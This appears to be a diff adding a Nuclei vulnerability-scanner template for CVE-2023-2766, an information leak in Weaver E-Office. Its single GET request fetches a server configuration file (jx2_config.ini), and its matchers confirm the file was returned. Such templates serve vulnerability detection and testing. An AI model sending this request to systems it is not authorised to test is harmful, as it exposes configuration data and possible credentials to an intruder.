@@ -1,0 +1,24 @@
+id: Fanwei-eoffice-InformationLleakage
+
+info:
+  name: 泛微E-Office信息泄露漏洞(CVE-2023-2766)
+  author: 帝国绝凶虎の理塘纯真丁一郎
+  severity: high
+
+variables:
+  
+
+http:
+  - raw:
+      - |
+          GET /building/backmgr/urlpage/mobileurl/configfile/jx2_config.ini HTTP/1.1
+          Host: {{Hostname}}
+
+
+
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code == 200'
+          - 'contains(body, " = ")'
